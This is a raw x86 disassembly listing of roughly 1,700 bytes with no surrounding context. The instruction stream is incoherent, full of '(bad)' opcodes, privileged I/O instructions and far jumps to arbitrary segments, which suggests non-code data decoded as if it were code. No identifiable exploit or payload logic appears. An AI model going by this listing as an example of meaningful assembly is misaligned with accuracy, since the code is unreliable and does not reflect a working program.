  411f66:	dec    edi
  411f67:	pop    ecx
  411f68:	aam    0xa8
  411f6a:	pop    ebp
  411f6b:	mov    dh,0x7c
  411f6d:	jno    0x411f6c
  411f6f:	or     BYTE PTR [edi],al
  411f71:	cld    
  411f72:	(bad)  
  411f73:	std    
  411f74:	add    dh,BYTE PTR [edi-0x287ba3da]
  411f7a:	dec    ebx
  411f7b:	mov    eax,ds:0x7cd562f6
  411f80:	xchg   esp,eax
  411f81:	mov    BYTE PTR ds:0xb818122b,bl
  411f87:	push   edi
  411f88:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411f89:	popf   
  411f8a:	jge    0x411faf
  411f8c:	pop    edx
  411f8d:	ja     0x411f60
  411f8f:	add    eax,0x66aa88e9
  411f94:	mov    ebx,0xf9dabd3
  411f99:	inc    ebx
  411f9a:	jns    0x411f6f
  411f9c:	call   DWORD PTR [eax-0x3d]
  411f9f:	arpl   WORD PTR [edi-0x53],cx
  411fa2:	dec    esi
  411fa3:	test   BYTE PTR [edi-0x4a9a9c99],dl
  411fa9:	inc    ebx
  411faa:	pcmpgtd mm6,QWORD PTR [ebp-0x69e9245c]
  411fb1:	dec    ebx
  411fb2:	push   edx
  411fb3:	daa    
  411fb4:	lock pop ss
  411fb6:	icebp  
  411fb7:	fist   WORD PTR [ebp+ebp*2-0x55]
  411fbb:	loop   0x411fb4
  411fbd:	mov    bl,0x11
  411fbf:	pop    es
  411fc0:	dec    esp
  411fc1:	fnstenv [ebp+esi*8-0x18]
  411fc5:	enter  0x9202,0xe4
  411fc9:	out    dx,eax
  411fca:	or     BYTE PTR [ecx],dl
  411fcc:	int3   
  411fcd:	shl    DWORD PTR [ecx],1
  411fcf:	add    DWORD PTR [ebx-0x800fd18],esi
  411fd5:	pop    edx
  411fd7:	out    0x49,eax
  411fd9:	push   ebp
  411fda:	call   0x5aea01c5
  411fdf:	jbe    0x41204e
  411fe1:	int    0x87
  411fe3:	mov    ds,WORD PTR ds:0x89ae71d9
  411fe9:	jp     0x412005
  411feb:	push   ebx
  411fec:	push   0x7d
  411fee:	int3   
  411fef:	inc    ebp
  411ff0:	je     0x412029
  411ff2:	push   esi
  411ff3:	push   esi
  411ff4:	xchg   ebx,eax
  411ff5:	cmp    al,0x94
  411ff7:	dec    ecx
  411ff8:	inc    edi
  411ff9:	neg    BYTE PTR [ecx-0x1503d696]
  411fff:	add    bh,BYTE PTR [ecx+eax*4-0x31]
  412003:	leave  
  412004:	cmp    eax,ebp
  412006:	pop    edi
  412007:	adc    al,0xee
  412009:	push   ebp
  41200a:	aas    
  41200b:	sub    esi,ebx
  41200d:	mov    ch,BYTE PTR [edi-0x1046a9a0]
  412013:	aam    0xc7
  412015:	ss lock dec edx
  412018:	ss mov edx,0xed99ee42
  41201e:	ins    DWORD PTR es:[edi],dx
  41201f:	mov    ebx,ebx
  412021:	and    DWORD PTR [edx],esi
  412023:	jne    0x41201c
  412025:	int3   
  412026:	jp     0x41202b
  412028:	ja     0x412046
  41202a:	pop    edi
  41202b:	mov    al,ah
  41202d:	call   0xc8c2:0x26c849ce
  412034:	in     al,0x29
  412036:	sub    BYTE PTR [edx+0x2a],al
  412039:	es (bad) 
  41203b:	jbe    0x41207f
  41203d:	arpl   bx,ax
  41203f:	adc    al,0xac
  412041:	js     0x411fd9
  412043:	jl     0x411fda
  412045:	mov    dl,0xcb
  412048:	jmp    0x474f:0x7a192f8f
  41204f:	cmp    ebx,DWORD PTR [esi]
  412051:	iret   
  412052:	aaa    
  412053:	cmp    al,0x6d
  412055:	sahf   
  412056:	inc    eax
  412057:	fidivr WORD PTR [edx-0x60]
  41205a:	push   ds
  41205b:	or     al,0xce
  41205d:	je     0x4120b7
  41205f:	and    ah,dl
  412061:	mov    al,0x91
  412063:	mov    eax,0xad61988b
  412068:	sbb    BYTE PTR [ebp+0x26a232e3],cl
  41206e:	mov    ds:0x5b6d957d,eax
  412073:	aaa    
  412074:	ret    0x8e72
  412077:	and    BYTE PTR [edi-0x7f],al
  41207a:	bound  edi,QWORD PTR [ecx+esi*4-0x5250e183]
  412081:	sbb    bh,ah
  412083:	cmp    ah,BYTE PTR [eax]
  412085:	and    al,0x30
  412087:	jns    0x4120b4
  412089:	es dec ecx
  41208b:	xor    al,0x47
  41208d:	adc    al,0xad
  41208f:	ret    0x3747
  412092:	bound  ecx,QWORD PTR [eax-0x114610bc]
  412098:	es push eax
  41209a:	add    DWORD PTR ds:0x40234496,0xfffffff6
  4120a1:	pushf  
  4120a2:	pop    ds
  4120a3:	xchg   ecx,eax
  4120a4:	adc    dh,bh
  4120a6:	(bad)  
  4120a7:	mov    edi,0xd6b01805
  4120ac:	stos   DWORD PTR es:[edi],eax
  4120ad:	add    eax,0xa59fa2a1
  4120b2:	ret    0xc66a
  4120b5:	push   edi
  4120b6:	sbb    bh,BYTE PTR [ebp-0x7f911eca]
  4120bc:	stos   BYTE PTR es:[edi],al
  4120bd:	rcr    DWORD PTR [ebp+0x68],1
  4120c0:	dec    ebx
  4120c1:	sub    DWORD PTR [ebx+0x3b],ebx
  4120c4:	jg     0x4120ef
  4120c6:	cmp    esi,esi
  4120c8:	inc    esp
  4120c9:	arpl   WORD PTR [edi],si
  4120cb:	jmp    0x60b:0xd3e73d66
  4120d2:	call   0x981e:0x63f0e7dd
  4120d9:	arpl   WORD PTR [edi-0x46],cx
  4120dc:	fdivr  st,st(2)
  4120de:	jmp    0x412070
  4120e0:	jge    0x4120ae
  4120e2:	jbe    0x412149
  4120e4:	fidiv  DWORD PTR es:[ebp-0x23]
  4120e8:	mov    ds:0x2a593f81,eax
  4120ed:	xchg   edx,eax
  4120ee:	dec    esp
  4120ef:	cmp    dl,BYTE PTR [edi-0x21c9bb4d]
  4120f5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4120f6:	call   0x9b66:0x9a548ace
  4120fd:	sub    ah,dh
  4120ff:	jne    0x4120e5
  412101:	sub    dl,BYTE PTR [edx+0xfd8b556]
  412107:	cld    
  412108:	imul   ebp,DWORD PTR ds:0x57741bff,0xffffff9e
  41210f:	dec    edx
  412110:	test   dl,bl
  412112:	test   eax,0x9125ac62
  412117:	lods   eax,DWORD PTR ds:[esi]
  412118:	push   ds
  412119:	jnp    0x412156
  41211b:	inc    esp
  41211c:	imul   eax,DWORD PTR [edi+ebx*8],0x8fe2c948
  412123:	das    
  412124:	dec    eax
  412125:	dec    esi
  412126:	ja     0x4120fa
  412128:	xchg   esp,eax
  412129:	mov    edi,0x2d640b85
  41212e:	into   
  41212f:	jnp    0x412168
  412131:	icebp  
  412132:	leave  
  412133:	mov    eax,ds:0xd95f4a7d
  412138:	repnz cmp edi,ebx
  41213b:	in     eax,dx
  41213c:	es enter 0xbfc7,0xa
  412141:	(bad)  
  412142:	inc    ebx
  412144:	mov    bh,0xbb
  412146:	xor    BYTE PTR [esi+0x4de6dfb4],dl
  41214c:	mov    WORD PTR [eax-0x7],fs
  41214f:	cmp    dl,BYTE PTR [edi]
  412151:	inc    edx
  412152:	jno    0x41214c
  412154:	cwde   
  412155:	pop    esi
  412156:	add    eax,0xcae06211
  41215b:	mov    ds:0x24bd85b0,al
  412160:	adc    ebx,edi
  412162:	adc    DWORD PTR [edi+0x36bf73b7],edi
  412168:	adc    eax,0x27843c5
  41216d:	jmp    0x14e9326d
  412172:	fisubr WORD PTR [eax+0x536a9d9a]
  412178:	aas    
  412179:	sub    DWORD PTR [ebx+0x75],edx
  41217c:	das    
  41217d:	mov    DWORD PTR [esi+0x25edc701],eax
  412183:	add    bl,BYTE PTR [ebx]
  412185:	or     BYTE PTR [ebp-0x2f50408a],bl
  41218b:	fbstp  TBYTE PTR [eax]
  41218d:	adc    DWORD PTR [ebx+0x1f],esp
  412190:	(bad)  [edx-0x7e8fb4ac]
  412196:	test   DWORD PTR [esi+0x66a36de3],esp
  41219c:	cld    
  41219d:	cwde   
  41219e:	jo     0x41218f
  4121a0:	push   0x95ad7bc7
  4121a5:	aam    0xd2
  4121a7:	jae    0x4121d9
  4121a9:	xlat   BYTE PTR ds:[ebx]
  4121aa:	daa    
  4121ab:	mov    esi,0xb812e248
  4121b0:	icebp  
  4121b1:	push   ebx
  4121b2:	sbb    al,0xd8
  4121b4:	in     al,0xf
  4121b6:	sub    DWORD PTR [edi+0x4],edi
  4121b9:	nop
  4121ba:	inc    ebp
  4121bb:	xlat   BYTE PTR ds:[ebx]
  4121bc:	xchg   edx,eax
  4121bd:	pop    es
  4121be:	xor    DWORD PTR [ecx],edx
  4121c0:	ja     0x4121f5
  4121c2:	sbb    al,0xfe
  4121c4:	imul   BYTE PTR [eax]
  4121c6:	bound  ebx,QWORD PTR [edx+0x22c5eb18]
  4121cc:	push   edi
  4121cd:	mov    esp,0xc5e9f09a
  4121d2:	mov    edx,0x186cb815
  4121d7:	call   DWORD PTR [edx]
  4121d9:	mov    ebx,0xe8811496
  4121de:	das    
  4121df:	sbb    eax,0x842e7d95
  4121e4:	(bad)  
  4121e5:	(bad)  
  4121e6:	dec    ebx
  4121e7:	push   cs
  4121e8:	test   eax,0xc66e39f9
  4121ed:	mov    ebp,gs
  4121ef:	add    al,0x45
  4121f1:	pop    ebx
  4121f2:	mov    ecx,0x88524886
  4121f7:	iret   
  4121f8:	push   esi
  4121f9:	stc    
  4121fa:	gs mov ebx,ebx
  4121fd:	add    al,0xa0
  4121ff:	outs   dx,DWORD PTR ds:[esi]
  412200:	push   ds
  412201:	pop    ebx
  412202:	or     al,0x6b
  412204:	cs dec ebx
  412206:	enter  0xb2e8,0xfe
  41220a:	es stos DWORD PTR es:[edi],eax
  41220c:	sbb    al,0x63
  41220e:	jno    0x412232
  412210:	xor    BYTE PTR [ecx],dl
  412212:	pop    es
  412213:	(bad)
  412216:	std    
  412217:	mov    WORD PTR [esi-0x1d],ss
  41221a:	dec    ecx
  41221b:	pusha  
  41221c:	mul    bl
  41221e:	pop    ebx
  41221f:	jmp    0xf93c:0xbbe6137e
  412226:	dec    ebx
  412227:	xchg   ecx,eax
  412228:	ror    bl,0x92
  41222b:	inc    ecx
  41222c:	fidiv  WORD PTR [ecx]
  41222e:	jmp    0xd0dae14d
  412233:	das    
  412234:	frstor [esi]
  412236:	jg     0x4121f8
  412238:	loopne 0x412291
  41223a:	adc    ch,BYTE PTR [edi-0x1e]
  41223d:	or     al,0xeb
  41223f:	addr16 xchg edx,eax
  412241:	(bad)  
  412242:	sub    edx,esp
  412244:	sub    ch,bh
  412246:	jl     0x41226a
  412248:	dec    eax
  412249:	jnp    0x4121e0
  41224b:	and    edx,DWORD PTR [ecx-0x1b]
  41224e:	loope  0x4121da
  412250:	bound  edi,QWORD PTR ds:0xf77f27ff
  412256:	ins    DWORD PTR es:[edi],dx
  412257:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412258:	cli    
  412259:	dec    eax
  41225a:	shl    BYTE PTR [ebp+0x43b8b951],cl
  412260:	cmp    edx,DWORD PTR [ebx]
  412262:	sbb    al,0x5d
  412264:	shl    BYTE PTR [edi-0x384b6058],cl
  41226a:	jne    0x4122d2
  41226c:	mov    ebp,0xfcafdaf
  412271:	xchg   edx,eax
  412272:	leave  
  412273:	jmp    0x5b9d:0x245fb0fa
  41227a:	loope  0x41224d
  41227c:	jp     0x41220b
  41227e:	xchg   edx,eax
  41227f:	leave  
  412280:	stos   BYTE PTR es:[edi],al
  412281:	jno    0x412266
  412283:	jp     0x4122c8
  412285:	mov    ds:0xf504db31,eax
  41228a:	xchg   ecx,eax
  41228b:	mov    gs,WORD PTR [eax-0x7d]
  41228e:	dec    edx
  41228f:	das    
  412290:	mov    eax,ds:0x7f0e600a
  412295:	int    0x22
  412297:	dec    esi
  412298:	dec    eax
  412299:	test   esp,ecx
  41229b:	xor    ch,BYTE PTR [esi-0x7a]
  41229e:	sub    ch,BYTE PTR [edx+0xc52ee6e]
  4122a4:	rcr    DWORD PTR [esi-0x19],0xcb
  4122a8:	dec    esp
  4122a9:	fst    DWORD PTR [esi+0x7b]
  4122ac:	sar    ebx,cl
  4122ae:	push   ecx
  4122af:	adc    eax,0x5e357167
  4122b4:	cmp    eax,0x436ef433
  4122b9:	adc    BYTE PTR [edx-0x72],bh
  4122bc:	setne  bh
  4122bf:	mov    edx,0xc15c03ac
  4122c4:	outs   dx,BYTE PTR ds:[esi]
  4122c5:	mov    ch,0xdc
  4122c7:	jle    0x41226f
  4122c9:	sub    al,BYTE PTR [edx]
  4122cb:	cmp    BYTE PTR [eax],dl
  4122cd:	retf   0x2713
  4122d0:	ds jg  0x412329
  4122d3:	das    
  4122d4:	mov    ax,ds:0x1ed4fad5
  4122da:	adc    dh,BYTE PTR [edi-0x18]
  4122dd:	ds retf 
  4122df:	adc    BYTE PTR [edx+ecx*8],bl
  4122e2:	sub    eax,0xabeaa2ec
  4122e7:	lock push esi
  4122e9:	dec    ecx
  4122ea:	dec    ecx
  4122eb:	lods   al,BYTE PTR ds:[esi]
  4122ec:	out    dx,al
  4122ed:	jl     0x412270
  4122ef:	sbb    ebp,DWORD PTR [ebx-0x653d4cf6]
  4122f5:	cmp    ebx,edx
  4122f7:	jmp    0x4122f0
  4122f9:	and    ecx,esi
  4122fb:	add    al,BYTE PTR [ecx-0x143cf037]
  412301:	jo     0x41231b
  412303:	dec    esi
  412304:	repz lock push 0xffffffbf
  412308:	lods   al,BYTE PTR ds:[esi]
  412309:	inc    ebp
  41230a:	adc    dl,ah
  41230c:	call   0x87fe:0x500d4eb4
  412313:	out    dx,eax
  412314:	jmp    0x2f22413c
  412319:	out    0xeb,al
  41231b:	lahf   
  41231c:	xor    DWORD PTR [ecx-0x5a],ecx
  41231f:	jmp    0x4122e5
  412321:	ss dec ebx
  412323:	loope  0x4122a5
  412325:	inc    esi
  412326:	ins    DWORD PTR es:[edi],dx
  412327:	imul   DWORD PTR [edx+0x43eeab15]
  41232d:	ret    0x5711
  412330:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412331:	add    DWORD PTR [ecx+0x14],0x5f
  412335:	mov    al,0x5a
  412337:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412338:	neg    BYTE PTR [edx+0x3e92f7d5]
  41233e:	mov    dl,0xab
  412340:	loopne 0x412316
  412342:	xor    ch,BYTE PTR [ebx-0x40]
  412345:	sbb    edi,DWORD PTR [ebx+0x1361522a]
  41234b:	(bad)  
  41234c:	in     al,dx
  41234d:	and    eax,0x1081e2e2
  412352:	mov    ch,BYTE PTR [ecx]
  412354:	sub    eax,0x63f17580
  412359:	or     eax,DWORD PTR [ebx+0x1f]
  41235c:	mov    ecx,0x71947678
  412361:	and    BYTE PTR [edx-0xe56e6d8],dl
  412367:	fs mov dl,0x6f
  41236a:	push   esp
  41236b:	fstp   TBYTE PTR [edi-0x1f]
  41236e:	int    0xa1
  412370:	aam    0x73
  412372:	inc    ebp
  412373:	add    BYTE PTR [edx],dl
  412375:	aam    0x60
  412377:	mov    bl,0x6b
  412379:	add    al,0xed
  41237b:	sbb    esi,esi
  41237d:	pop    ds
  41237e:	aad    0x75
  412380:	push   0x4beca354
  412385:	mov    dl,0x55
  412387:	ds inc ebp
  412389:	and    BYTE PTR [eax+0x1f5122ce],ch
  41238f:	dec    esp
  412390:	pop    ds
  412391:	ds pop ds
  412393:	jp     0x41234b
  412395:	mov    ch,0xf0
  412397:	jle    0x412340
  412399:	jecxz  0x412324
  41239b:	gs pop esi
  41239d:	pop    edx
  41239e:	in     eax,0xc7
  4123a0:	sbb    al,0xe2
  4123a2:	(bad)  
  4123a3:	loop   0x412372
  4123a5:	adc    ebp,esp
  4123a7:	stos   BYTE PTR es:[edi],al
  4123a8:	mov    cl,BYTE PTR [ebp-0x4fe248de]
  4123ae:	cmp    ch,ch
  4123b0:	push   ss
  4123b1:	cmp    DWORD PTR [edi-0x42],ecx
  4123b4:	test   al,0x14
  4123b6:	(bad)  
  4123b7:	mov    eax,ds:0xe22d5cee
  4123bc:	mov    esi,0x510771e3
  4123c1:	inc    ebp
  4123c2:	pop    edi
  4123c3:	popf   
  4123c4:	xchg   edx,eax
  4123c5:	or     DWORD PTR [eax-0x7e92d5c9],edi
  4123cb:	mov    cl,0x79
  4123cd:	int    0xf7
  4123cf:	inc    edx
  4123d0:	pop    eax
  4123d1:	in     al,dx
  4123d2:	arpl   WORD PTR [eax+0x7a0b503e],ax
  4123d8:	fabs   
  4123da:	jne    0x412407
  4123dc:	mov    gs,WORD PTR [eax-0x175827ee]
  4123e2:	push   es
  4123e3:	lods   eax,DWORD PTR ds:[esi]
  4123e4:	xchg   DWORD PTR [esi+0x58bfc011],esi
  4123ea:	je     0x41241a
  4123ec:	mov    cl,0x46
  4123ee:	sbb    DWORD PTR [edx+0x3d1f0c05],ebx
  4123f4:	dec    esi
  4123f5:	ret    0x86f8
  4123f8:	out    0x48,eax
  4123fa:	pusha  
  4123fb:	leave  
  4123fc:	push   edx
  4123fd:	repnz mov edi,0x793b1454
  412403:	push   edx
  412404:	add    al,0x2b
  412406:	add    edx,ebp
  412408:	sbb    eax,0xf9a012e0
  41240d:	cmp    eax,0x6bcd8806
  412412:	and    ebx,eax
  412414:	jmp    0x41244e
  412416:	sbb    eax,0xbbbd775b
  41241b:	lods   al,BYTE PTR ds:[esi]
  41241c:	pushf  
  41241d:	test   DWORD PTR [edi-0x43],ecx
  412420:	dec    edi
  412421:	sub    edi,DWORD PTR [ecx+0x53138420]
  412427:	ret    
  412428:	push   0xffffffc4
  41242a:	gs aaa 
  41242c:	std    
  41242d:	rcr    ebp,0x4
  412430:	pusha  
  412431:	inc    ebx
  412432:	inc    ecx
  412433:	sahf   
  412434:	out    dx,eax
  412435:	and    BYTE PTR [edi+0x42cf7abb],bh
  41243b:	xchg   ch,dh
  41243d:	sub    eax,0x4a3b48b
  412442:	fidiv  WORD PTR [edi+0x3e]
  412445:	int3   
  412446:	dec    esi
  412447:	xchg   edx,eax
  412449:	sub    cl,cl
  41244b:	daa    
  41244c:	std    
  41244d:	aas    
  41244e:	lahf   
  41244f:	push   0xbc59389d
  412454:	(bad)  
  412455:	out    0xb3,eax
  412457:	jl     0x412462
  412459:	(bad)
  41245c:	sbb    al,0xcc
  41245e:	push   ss
  41245f:	inc    ebp
  412460:	adc    eax,0x33660c07
  412465:	dec    ecx
  412466:	call   0x42ff:0x2ae418dd
  41246d:	retf   
  41246e:	gs dec ebp
  412470:	aas    
  412471:	fwait
  412472:	aam    0x79
  412474:	pop    esp
  412475:	jb     0x4124c5
  412477:	sti    
  412478:	dec    eax
  412479:	sub    al,0x54
  41247b:	mov    fs,WORD PTR [eax+0x8f193d5]
  412481:	lea    ecx,[edi-0x43d947ae]
  412487:	(bad)  
  412488:	clc    
  412489:	pop    ebx
  41248a:	mov    esi,0x20d77b0d
  41248f:	pusha  
  412490:	pop    es
  412491:	test   BYTE PTR [eiz*4+0x127b884f],dh
  412498:	out    dx,al
  412499:	fmul   QWORD PTR [edx+0x1a26dc4c]
  41249f:	push   cs
  4124a0:	je     0x412432
  4124a2:	push   0xaf48d5b9
  4124a7:	pop    ds
  4124a8:	fadd   QWORD PTR [eax-0x576fbc61]
  4124ae:	sbb    ebx,DWORD PTR [edx-0x5d]
  4124b1:	nop
  4124b2:	loop   0x41248f
  4124b4:	fwait
  4124b5:	xchg   ecx,eax
  4124b6:	aas    
  4124b7:	mov    ds:0xeac3b7bc,al
  4124bc:	lods   al,BYTE PTR ds:[esi]
  4124bd:	mov    bh,0x39
  4124bf:	call   0xcf7a:0x3c6e211b
  4124c6:	bound  ebx,QWORD PTR [ebp+0x72ef6406]
  4124cc:	xor    BYTE PTR [esi],dl
  4124ce:	aad    0x37
  4124d0:	pop    es
  4124d1:	or     DWORD PTR [ebp+edx*8+0x6016681c],0xffffffde
  4124d9:	(bad)  [ebx+ebp*4-0x4a]
  4124dd:	imul   BYTE PTR [ecx+edi*1+0x6f]
  4124e1:	and    ch,dh
  4124e3:	push   ds
  4124e4:	pop    ss
  4124e5:	fidivr WORD PTR [edx-0x5ee2912c]
  4124eb:	inc    esi
  4124ec:	pop    ds
  4124ed:	jle    0x4124e5
  4124ef:	pop    es
  4124f0:	hlt    
  4124f1:	(bad)  
  4124f2:	xor    edx,DWORD PTR [ebx+0xd47c4ab]
  4124f8:	xor    BYTE PTR [esi+ebx*2-0x1194a940],bl
  4124ff:	ret    0x3131
  412502:	ffreep st(4)
  412504:	in     al,dx
  412505:	sbb    BYTE PTR [eax],al
  412507:	ins    BYTE PTR es:[edi],dx
  412508:	cmp    BYTE PTR [edi-0x1f548788],bh
  41250e:	aad    0x77
  412510:	mov    dh,0xce
  412512:	dec    ebx
  412513:	sub    BYTE PTR [eax+0x30a41c31],bl
  412519:	pop    edx
  41251a:	jl     0x412599
  41251c:	adc    DWORD PTR [eax],esi
  41251e:	retf   0x1f13
  412521:	jne    0x4125a0
  412523:	das    
  412524:	in     al,dx
  412525:	jmp    FWORD PTR ds:0x7282dbe
  41252b:	sbb    al,0xc1
  41252d:	xor    DWORD PTR [ecx+0x2d],ebp
  412530:	fwait
  412531:	enter  0xb40c,0xc0
  412535:	popa   
  412536:	add    al,0x4f
  412538:	mov    al,ds:0xaa372fc6
  41253d:	cmc    
  41253e:	jp     0x41251d
  412540:	inc    ebx
  412541:	sub    DWORD PTR [esi],esi
  412543:	retf   0x2d28
  412546:	mov    eax,0x6ae52889
  41254b:	jp     0x4125a1
  41254d:	in     al,0x29
  41254f:	pop    esi
  412550:	loopne 0x4125ba
  412552:	jge    0x412581
  412554:	pop    eax
  412555:	push   es
  412556:	fwait
  412557:	jno    0x41251c
  412559:	and    edx,eax
  41255b:	js     0x412587
  41255d:	adc    al,BYTE PTR [edi+eax*1-0x74dad1a7]
  412564:	jbe    0x412562
  412566:	xchg   ecx,eax
  412567:	mov    ecx,0xecb4146d
  41256c:	sub    eax,0x625529e1
  412571:	(bad)  
  412572:	jnp    0x412518
  412574:	pop    eax
  412575:	retf   
  412576:	jns    0x412506
  412578:	adc    al,0x16
  41257a:	mov    ecx,0x30e20cdb
  41257f:	out    0x28,al
  412581:	pop    eax
  412582:	sbb    al,bl
  412584:	ds push ecx
  412586:	pusha  
  412587:	outs   dx,DWORD PTR ds:[esi]
  412588:	stos   DWORD PTR es:[edi],eax
  412589:	sar    BYTE PTR [edi+0x31],cl
  41258c:	add    eax,ecx
  41258e:	dec    ebx
  41258f:	inc    esp
  412590:	cdq    
  412591:	es sub al,0x3a
  412594:	pop    ebp
  412595:	pusha  
  412596:	push   es
  412597:	pusha  
  412598:	pop    ecx
  412599:	stos   DWORD PTR es:[edi],eax
  41259a:	addr16 mov cl,0xdb
  41259d:	test   al,0x55
  41259f:	in     al,dx
  4125a0:	rcr    BYTE PTR [ebp-0x80],0x95
  4125a4:	sahf   
  4125a5:	ret    0xd9f7
  4125a8:	sub    BYTE PTR [esi+0x56e03aa7],al
  4125ae:	jg     0x4125c1
  4125b0:	push   edx
  4125b1:	or     DWORD PTR [ebp+0x10cbeb3e],eax
  4125b7:	scas   eax,DWORD PTR es:[edi]
  4125b8:	in     eax,dx
  4125b9:	mov    BYTE PTR [edi-0x2a],bl
  4125bc:	(bad)  
  4125bd:	dec    ecx
  4125be:	xlat   BYTE PTR ds:[ebx]
  4125bf:	mov    ah,0x77
  4125c1:	mul    BYTE PTR [ebx]
  4125c3:	or     esi,0xbc26f260
  4125c9:	mov    eax,0x8043f1a5
  4125ce:	mov    BYTE PTR [ecx],cl
  4125d0:	aas    
  4125d1:	cld    
  4125d2:	xlat   BYTE PTR gs:[ebx]
  4125d4:	into   
  4125d5:	ds inc esi
  4125d7:	mov    edi,0xb8772149
  4125dc:	mov    edx,0xc00e2894
  4125e1:	adc    BYTE PTR [edx+eiz*2],0xae
  4125e5:	cwde   
  4125e6:	(bad)  
  4125e7:	out    0x2c,al
  4125e9:	push   edi
  4125ea:	and    bh,BYTE PTR [ecx+eax*8-0x10]
  4125ee:	repnz fwait
  4125f0:	loope  0x41260d
  4125f2:	fnstsw WORD PTR ss:[ebp-0x2be3bd8d]
  4125f9:	mov    cl,0x84
  4125fb:	adc    DWORD PTR [esi+0x75],ebx
  4125fe:	loopne 0x4125c4
  412600:	mov    ch,0xb3
  412602:	imul   esp,DWORD PTR [eax],0xd800ea5a
  412608:	sar    DWORD PTR [eax],1
  41260a:	cmp    BYTE PTR [esi+0x5c],ch
  41260d:	add    ah,BYTE PTR [ebp-0x706b8b69]
  412613:	xchg   ebx,eax
  412614:	pop    esi
  412615:	mov    bl,0xc0
  412617:	into   
  412618:	jae    0x412637
  41261a:	scas   al,BYTE PTR es:[edi]
  41261b:	push   esi
  41261c:	mov    ah,0xb5
  41261e:	(bad)  
  41261f:	(bad)  
  412620:	mov    ebx,0x7342259d
  412625:	mov    cl,0x9c
  412627:	jae    0x412663
  412629:	frstor [edi]
  41262b:	xchg   DWORD PTR [eax-0x67],eax
  41262e:	xchg   al,bl
  412630:	add    BYTE PTR [eax+0x66],ch
  412633:	push   edi
  412634:	xlat   BYTE PTR ds:[ebx]
  412635:	pop    ebp
  412636:	pusha  
  412637:	or     dl,bh
  412639:	jnp    0x4126b2
  41263b:	pop    ebp
  41263c:	mov    dh,0x98
  41263e:	in     al,dx
  41263f:	xchg   edi,eax
  412640:	push   0xffffff8d
  412642:	test   DWORD PTR [ebx+ebp*2+0x5f45ca45],edi
  412649:	xchg   bh,bl
  41264b:	scas   eax,DWORD PTR es:[edi]
  41264c:	sti    
  41264d:	and    ecx,DWORD PTR [edx]
  41264f:	lea    ecx,ds:[esp+edi*1+0x20ac80a9]
  412657:	sahf   
  412658:	stos   BYTE PTR es:[edi],al
  412659:	xchg   edx,eax
  41265a:	fwait
  41265b:	push   ds
  41265c:	aas    
  41265d:	ret    0x7f07
  412660:	shr    ebx,1
  412662:	mov    DWORD PTR [ecx-0x62],ebx
  412665:	xchg   esi,eax
  412666:	xchg   esp,eax
  412667:	shl    esp,0x7c
  41266a:	retf   
  41266b:	sbb    al,0x32
  41266d:	rcr    DWORD PTR [edx-0x11da70b],0x6c
  412674:	outs   dx,BYTE PTR ds:[esi]
  412675:	xlat   BYTE PTR ss:[ebx]
  412677:	pop    es
  412678:	scas   al,BYTE PTR es:[edi]
  412679:	jmp    0xd38357bf
  41267e:	mov    bl,0x93
  412680:	xor    eax,0xf2121ade
  412685:	xor    al,0xc9
  412687:	les    edi,FWORD PTR [eax]
  412689:	mov    BYTE PTR [edi-0x68863ef0],dh
  41268f:	gs scas eax,DWORD PTR es:[edi]
  412691:	dec    edx
  412692:	shl    BYTE PTR [ebp-0x37edcbf1],1
  412698:	mov    ecx,0x6c3535ab
  41269d:	mov    edx,esi
  41269f:	fild   WORD PTR [ebx-0x63]
  4126a2:	icebp  
  4126a3:	adc    BYTE PTR [ebx+0x32],bh
  4126a6:	nop
  4126a7:	sub    edi,DWORD PTR [esi+esi*2]
  4126aa:	push   ebp
  4126ab:	sbb    bh,BYTE PTR [eax+0x13]
  4126ae:	in     al,dx
  4126af:	pop    esp
  4126b0:	sbb    DWORD PTR [edi+0x25],esi
  4126b3:	adc    al,0xe
  4126b5:	lea    eax,[esi+0x58]
  4126b8:	es inc ecx
  4126ba:	cmp    al,0x39
  4126bc:	mov    edx,0x1041089d
  4126c1:	adc    cl,BYTE PTR [ebx+0x11b15719]
  4126c7:	into   
  4126c8:	dec    ebp
  4126c9:	sub    esp,esi
  4126cb:	icebp  
  4126cc:	mov    esp,0x286a81f2
  4126d1:	xlat   BYTE PTR ds:[ebx]
  4126d2:	cmp    DWORD PTR [edi+0x3501057d],edi
  4126d8:	xor    DWORD PTR [esi+0x5b1ef579],eax
  4126de:	nop
  4126df:	inc    esi
  4126e0:	and    dl,BYTE PTR [ecx-0x23]
  4126e3:	test   al,0x8f
  4126e5:	add    al,0xad
  4126e7:	ret    
  4126e8:	iret   
  4126e9:	mov    ecx,0x1e72698
  4126ee:	mov    cl,0x68
  4126f0:	push   edx
  4126f1:	sbb    al,0x9d
  4126f3:	loope  0x4126f7
  4126f5:	add    al,0x2e
  4126f7:	add    cl,0x67
  4126fa:	(bad)  
  4126fb:	aam    0xf0
  4126fd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4126fe:	push   es
  4126ff:	ret    0x1d70
  412702:	mov    ah,0x9b
  412704:	(bad)  
  412705:	test   al,0xb6
  412707:	mov    ecx,fs
  412709:	ds leave 
  41270b:	ret    
  41270c:	jne    0x4126eb
  41270e:	add    esi,DWORD PTR ds:0xca2e6402
  412714:	mov    esp,0x64ac886a
  412719:	inc    ecx
  41271a:	mov    dh,0x7b
  41271c:	adc    edx,DWORD PTR [ebp-0x29a73837]
  412722:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412723:	mov    esi,0x47c259f4
  412728:	sahf   
  412729:	fsub   st,st(2)
  41272b:	add    eax,0x99372b00
  412730:	lock mov eax,ds:0x88e6fbe9
  412736:	and    eax,0xc0c7fd79
  41273b:	and    DWORD PTR [ebp-0x260df28e],ecx
  412741:	jecxz  0x4126fb
  412743:	push   esp
  412744:	jns    0x41277e
  412746:	pop    esi
  412747:	push   ebx
  412748:	rcl    edi,1
  41274a:	int    0xa3
  41274c:	jb     0x4126f7
  41274e:	mov    DWORD PTR [eax],edi
  412750:	add    cl,BYTE PTR [ecx+ebx*8+0x123d3253]
  412757:	adc    dl,al
  412759:	push   edi
  41275a:	mov    ?,WORD PTR [ecx+esi*2+0x267b2b7f]
  412761:	(bad)  
  412763:	mov    gs,WORD PTR [edi+edi*2+0x13]
  412767:	jmp    0x4127a0
  412769:	arpl   sp,di
  41276b:	xor    eax,0x59a0c306
  412770:	dec    esi
  412771:	and    ecx,DWORD PTR [eax]
